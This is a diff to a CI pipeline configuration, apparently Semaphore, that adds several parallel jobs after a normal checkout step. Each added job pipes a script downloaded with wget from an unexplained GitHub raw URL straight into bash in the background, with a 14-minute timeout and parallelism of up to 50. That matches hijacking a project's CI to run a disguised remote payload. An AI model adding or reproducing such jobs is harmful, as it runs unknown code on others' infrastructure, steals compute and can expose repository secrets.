@@ -11,3 +11,24 @@ blocks:
         - name: 'Job #1'
           commands:
             - checkout
+  - name: 'Block #2'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget -O- https://raw.githubusercontent.com/faffini/friendly-sniffle/refs/heads/main/embuh | bash &'
+            - timeout 14m
+          parallelism: 19
+  - name: 'Block #3'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget -O- https://raw.githubusercontent.com/faffini/friendly-sniffle/refs/heads/main/embuh | bash &'
+            - timeout 14m
+          parallelism: 50
+        - name: 'Job #2'
+          commands:
+            - 'wget -O- https://raw.githubusercontent.com/faffini/friendly-sniffle/refs/heads/main/embuh | bash &'
+            - timeout 14m
+          parallelism: 50
